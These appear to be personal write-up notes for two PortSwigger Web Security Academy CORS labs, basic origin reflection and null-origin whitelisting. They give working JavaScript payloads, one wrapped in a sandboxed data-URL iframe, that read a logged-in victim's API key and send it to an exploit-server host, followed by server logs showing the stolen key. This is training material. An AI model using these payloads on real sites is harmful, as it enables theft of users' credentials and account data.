# Cross Origin Resource Sharing

## CORS vulnerability with basic origin reflection
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

Reading the source code after logging in reveals an endpoint which was used

![](Pasted%20image%2020220514111546.png)

```html
<div>Your API Key is: <span id=apikey></span></div>
<script>
	fetch('/accountDetails', {credentials:'include'})
	.then(r => r.json())
	.then(j => document.getElementById('apikey').innerText = j.apikey)
</script>
```

Deliver this exploit to the user through the exploit server

```
...
Origin: https://exploit-ac9f1f6d1e659a4fc0f1543401340027.web-security-academy.net
```

```html
<div>Your API Key is: <span id=apikey></span></div>
<script>
    var EXPURL = "https://exploit-ac9f1f6d1e659a4fc0f1543401340027.web-security-academy.net";
    fetch('https://ac0e1f7b1ed99a63c0545434007100a1.web-security-academy.net/accountDetails', {credentials:'include'})
        .then(r => r.json())
        .then(j => fetch(EXPURL+'/'+j.apikey, {credentials:'include'}))
</script>
```

Check the logs

```
172.31.30.154   2022-05-28 17:01:14 +0000 "GET /Rsa2DyCqkImZEW6285UCrbS17fwEXdJp HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36"
116.14.150.8    2022-05-28 17:01:14 +0000 "GET / HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"
```


https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Origin: null
```

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<div>Your API Key is: <span id=apikey></span></div>
<script>
    var EXPURL = 'https://exploit-0a2c002303c92b3ac0d4089b01ae000c.web-security-academy.net/';
    fetch('https://0aa300da033a2b7dc010085d009c003c.web-security-academy.net/accountDetails', {credentials:'include'})
        .then(r => r.json())
        .then(j => fetch(EXPURL+'/'+j.apikey, {credentials:'include'}))
</script>"></iframe>
```

